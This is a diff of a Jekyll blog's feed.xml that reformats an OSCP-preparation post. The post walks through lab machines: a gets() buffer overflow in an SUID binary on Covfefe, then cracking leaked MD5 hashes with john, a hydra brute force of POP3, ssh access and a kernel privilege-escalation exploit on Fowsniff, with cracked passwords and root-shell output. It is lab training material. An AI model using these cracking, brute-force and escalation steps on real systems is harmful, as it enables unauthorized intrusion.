@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-03-02T22:00:56+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Zwerd</title><subtitle>A stunning blog of freaking Cyber warrior</subtitle><author><name>Guy Zwerdling</name></author><entry><title type="html">The Full Methodology for OSCP Passing.</title><link href="http://localhost:4000/2024/02/18/oscp_path.html" rel="alternate" type="text/html" title="The Full Methodology for OSCP Passing." /><published>2024-02-18T00:00:00+02:00</published><updated>2024-02-18T00:00:00+02:00</updated><id>http://localhost:4000/2024/02/18/oscp_path</id><content type="html" xml:base="http://localhost:4000/2024/02/18/oscp_path.html">&lt;p&gt;Lately, I’ve been thinking a lot about some job interviews I had recently, especially one at a really good organization near to my aria. The interviews were interesting and kind of tough, and they got me thinking about my work and where I’m headed.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-03-02T22:11:10+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Zwerd</title><subtitle>A stunning blog of freaking Cyber warrior</subtitle><author><name>Guy Zwerdling</name></author><entry><title type="html">The Full Methodology for OSCP Passing.</title><link href="http://localhost:4000/2024/02/18/oscp_path.html" rel="alternate" type="text/html" title="The Full Methodology for OSCP Passing." /><published>2024-02-18T00:00:00+02:00</published><updated>2024-02-18T00:00:00+02:00</updated><id>http://localhost:4000/2024/02/18/oscp_path</id><content type="html" xml:base="http://localhost:4000/2024/02/18/oscp_path.html">&lt;p&gt;Lately, I’ve been thinking a lot about some job interviews I had recently, especially one at a really good organization near to my aria. The interviews were interesting and kind of tough, and they got me thinking about my work and where I’m headed.&lt;/p&gt;
 
 &lt;p&gt;The first interview was on Zoom and was all about technical stuff. They asked me about Wireshark, which is a tool for analyzing network traffic, and about different protocols like TCP, LDAP, and SMB2. They also asked about things like Linux processes and sockets, which are like communication channels between computers. It was a good chat, and I felt like I could talk to them easily. They even explained what comes next in their hiring process.&lt;/p&gt;
 
@@ -123,29 +123,24 @@ simon@covfefe:~$&lt;/p&gt;
   &lt;li&gt;
     &lt;p&gt;System Enumeration: running &lt;code class=&quot;highlighter-rouge&quot;&gt;linpeas&lt;/code&gt; found that we have access to /root directory but we can’t read the flag (we are not the root), but we can see read_message.c and also found read_message binary with SUID, so since we can read the source code it may mean that we can run for buffer overflow against it to gain root.&lt;/p&gt;
   &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Buffer Overflow: We need first to read the code to understand what dose it do, we can transfer it to our local machine and use gdb, in our case by looking the code it’s self we can un derstand how to break it:&lt;/p&gt;
+  &lt;li&gt;Buffer Overflow: We need first to read the code to understand what dose it do, we can transfer it to our local machine and use gdb, in our case by looking the code it’s self we can un derstand how to break it:
     &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int main(int argc, char *argv[]) {
 char program[] = &quot;/usr/local/sbin/message&quot;;
 char buf[20];
 char authorized[] = &quot;Simon&quot;;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;In that lines there is a &lt;code class=&quot;highlighter-rouge&quot;&gt;buf&lt;/code&gt; variable which is in the size of 20 chars, the authorized is Simon and later it used to check the value from the user input if it match.&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;printf(&quot;What is your name?\n&quot;);
+    &lt;p&gt;In that lines there is a &lt;code class=&quot;highlighter-rouge&quot;&gt;buf&lt;/code&gt; variable which is in the size of 20 chars, the authorized is Simon and later it used to check the value from the user input if it match.&lt;/p&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;printf(&quot;What is your name?\n&quot;);
 gets(buf);
 since gets have no bouderies we can exploit it
 if (!strncmp(authorized, buf, 5)) {
 printf(&quot;Hello %s! Here is your message:\n\n&quot;, buf);
 // This is safe as the user can't mess with the binary location:
 execve(program, NULL, NULL);
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;execve&lt;/code&gt; is used to run binary file, which in our case should be &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/local/sbin/message&lt;/code&gt;, since the matching on that code used for the five first chars we can overflow the &lt;code class=&quot;highlighter-rouge&quot;&gt;buf&lt;/code&gt; to
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;execve&lt;/code&gt; is used to run binary file, which in our case should be &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/local/sbin/message&lt;/code&gt;, since the matching on that code used for the five first chars we can overflow the &lt;code class=&quot;highlighter-rouge&quot;&gt;buf&lt;/code&gt; to
 contain more then 20 chars and after that overwrite the program value with another binary value, in my case &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;.&lt;/p&gt;
-
-&lt;ol&gt;
+  &lt;/li&gt;
   &lt;li&gt;Privalge Escalation: running the program with the values more then 20 chars and insert /bin/sh to gain shell as root:
     &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;simon@covfefe:~$ read_message
 What is your name?
@@ -164,17 +159,12 @@ uid=1000(simon) gid=1000(simon) euid=0(root) groups=1000(simon),24(cdrom),25(flo
   &lt;li&gt;Enumeration: running full port scan with &lt;code class=&quot;highlighter-rouge&quot;&gt;rustscan&lt;/code&gt; found that only 22,80,110,143 are open, so run &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; and found that none of the port look like interesting, so go against the web with &lt;code class=&quot;highlighter-rouge&quot;&gt;webenum&lt;/code&gt; found nothing but on the index.html page found the following which give clue what to do next:
     &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Fowsniff's internal system suffered a data breach that resulted in the exposure of employee usernames and passwords.
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;This lead us to run google search for &lt;code class=&quot;highlighter-rouge&quot;&gt;Fowsniff&lt;/code&gt; since it tell us that this system are exposure data, so with just a luck, you will find pastbin page that contain the following two links:&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;https://raw.githubusercontent.com/berzerk0/Fowsniff/main/fowsniff.txt&lt;/li&gt;
-  &lt;li&gt;https://web.archive.org/web/20200920053052/https://pastebin.com/NrAqVeeX&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;By going to this link we find users and passwords:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
+    &lt;p&gt;This lead us to run google search for &lt;code class=&quot;highlighter-rouge&quot;&gt;Fowsniff&lt;/code&gt; since it tell us that this system are exposure data, so with just a luck, you will find pastbin page that contain the following two links:&lt;/p&gt;
+    &lt;ul&gt;
+      &lt;li&gt;https://raw.githubusercontent.com/berzerk0/Fowsniff/main/fowsniff.txt&lt;/li&gt;
+      &lt;li&gt;https://web.archive.org/web/20200920053052/https://pastebin.com/NrAqVeeX
+By going to this link we find users and passwords:
+        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
 mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
 tegel@fowsniff:1dc352435fecca338acfd4be10984009
 baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
@@ -183,86 +173,84 @@ stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
 mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
 parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
 sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;ol&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
   &lt;li&gt;Hash Cracking: now after we have the hashs, we can use john or other tool to crack them all, you can also use crackstation.
-```
-└─$ john hashs.txt –wordlist=./pass.txt –format=Ra
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;└─$ john hashs.txt --wordlist=./pass.txt --format=Ra
 w-MD5
 Using default input encoding: UTF-8
 Loaded 9 password hashes with no different salts (Ra
 w-MD5 [MD5 128/128 AVX 4x3])
 Warning: no OpenMP support for this hash type, consi
-der –fork=4
-Press ‘q’ or Ctrl-C to abort, almost any other key f
+der --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key f
 or status
-mailcall         (mauer@fowsniff)   &lt;br /&gt;
-bilbo101         (mustikka@fowsniff)   &lt;br /&gt;
-apples01         (tegel@fowsniff)   &lt;br /&gt;
-skyler22         (baksteen@fowsniff)   &lt;br /&gt;
-scoobydoo2       (seina@fowsniff)   &lt;br /&gt;
-carp4ever        (mursten@fowsniff)   &lt;br /&gt;
-orlando12        (parede@fowsniff)   &lt;br /&gt;
-07011972         (sciana@fowsniff)   &lt;br /&gt;
+mailcall         (mauer@fowsniff)     
+bilbo101         (mustikka@fowsniff)     
+apples01         (tegel@fowsniff)     
+skyler22         (baksteen@fowsniff)     
+scoobydoo2       (seina@fowsniff)     
+carp4ever        (mursten@fowsniff)     
+orlando12        (parede@fowsniff)     
+07011972         (sciana@fowsniff)     
 8g 0:00:00:00 DONE (2022-10-18 05:55) 800.0g/s 1700p
 /s 1700c/s 15300C/s mailcall..07011972
 Warning: passwords printed above might not be all th
 ose cracked
-Use the “–show –format=Raw-MD5” options to display
+Use the &quot;--show --format=Raw-MD5&quot; options to display
  all of the cracked passwords reliably
-Session completed.&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-4. Brute Forcing: sicne we have the users and password, we can use it against the ssh, or pop3 (port 110) or IMAP (port 143), in my case I found the way over port 110:
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;└─$ hydra -L users.txt -P ./pass.txt 192.168.80.18 pop3&lt;br /&gt;
+Session completed.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Brute Forcing: sicne we have the users and password, we can use it against the ssh, or pop3 (port 110) or IMAP (port 143), in my case I found the way over port 110:
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;└─$ hydra -L users.txt -P ./pass.txt 192.168.80.18 pop3  
 output:
-[110][pop3] host: 192.168.80.18   login: seina   password: scoobydoo2&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-5. Initiation: login via pop3 using the user and password found, we can see that we on that user email box, so run several pop3 commands like `LIST`, `RETR 1`, found line that say what is the password for ssh:
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;The temporary password for SSH is “S1ck3nBluff+secureshell”&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Trying that password with seina user give us nothing, so run the brute force step again with the list of users we have with that password and found that ssh the correct user is `baksteen`, so run ssh with that user and password:
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;└─$ ssh baksteen@192.168.80.18 -p 22       &lt;br /&gt;
+[110][pop3] host: 192.168.80.18   login: seina   password: scoobydoo2
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Initiation: login via pop3 using the user and password found, we can see that we on that user email box, so run several pop3 commands like &lt;code class=&quot;highlighter-rouge&quot;&gt;LIST&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;RETR 1&lt;/code&gt;, found line that say what is the password for ssh:
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;The temporary password for SSH is &quot;S1ck3nBluff+secureshell&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;Trying that password with seina user give us nothing, so run the brute force step again with the list of users we have with that password and found that ssh the correct user is &lt;code class=&quot;highlighter-rouge&quot;&gt;baksteen&lt;/code&gt;, so run ssh with that user and password:&lt;/p&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;└─$ ssh baksteen@192.168.80.18 -p 22         
 output:
-baksteen@fowsniff:~$&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-6. System Enumeration: running several command for enumerate the system found the following linux version:
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;baksteen@fowsniff:~$ uname -a
+baksteen@fowsniff:~$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;System Enumeration: running several command for enumerate the system found the following linux version:
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;baksteen@fowsniff:~$ uname -a
 Linux fowsniff 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 U
-TC 2018 x86_64 x86_64 x86_64 GNU/Linux&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-By running `searchsploit` we can find exploit for that version:
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;└─$ searchsploit 4.4.0 linux kernel 116
-———————————————————————-
-———————— ———————————
- Exploit Title                                                      &lt;br /&gt;
-                        |  Path
-———————————————————————-
-———————— ———————————
-Linux Kernel 4.8.0 UDEV &amp;lt; 232 - Local Privilege Escalation          &lt;br /&gt;
-                        | linux/local/41886.c
+TC 2018 x86_64 x86_64 x86_64 GNU/Linux
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;By running &lt;code class=&quot;highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt; we can find exploit for that version:&lt;/p&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;└─$ searchsploit 4.4.0 linux kernel 116
+&lt;span class=&quot;gd&quot;&gt;----------------------------------------------------------------------
+------------------------ ---------------------------------
+&lt;/span&gt; Exploit Title                                                        
+                     |  Path
+&lt;span class=&quot;gd&quot;&gt;----------------------------------------------------------------------
+------------------------ ---------------------------------
+&lt;/span&gt;Linux Kernel 4.8.0 UDEV &amp;lt; 232 - Local Privilege Escalation            
+                     | linux/local/41886.c
 Linux Kernel &amp;lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation
-                        | linux/local/44298.c
-———————————————————————-
-———————— ———————————
-Shellcodes: No Results&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-7. Privilege Escalation: transfer the exploit to the target, run gcc to compile it and execute it give us root shell:
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;baksteen@fowsniff:~$ ./exploit
+                     | linux/local/44298.c
+&lt;span class=&quot;gd&quot;&gt;----------------------------------------------------------------------
+------------------------ ---------------------------------
+&lt;/span&gt;Shellcodes: No Results
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Privilege Escalation: transfer the exploit to the target, run gcc to compile it and execute it give us root shell:
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;baksteen@fowsniff:~$ ./exploit
 task_struct = ffff88003c761c00
 uidptr = ffff88003aa77a84
 spawning root shell
 root@fowsniff:~# id
 uid=0(root) gid=0(root) groups=0(root),100(users),1001(baksteen)
-```&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
 
 &lt;h3 id=&quot;geisha&quot;&gt;Geisha&lt;/h3&gt;
 
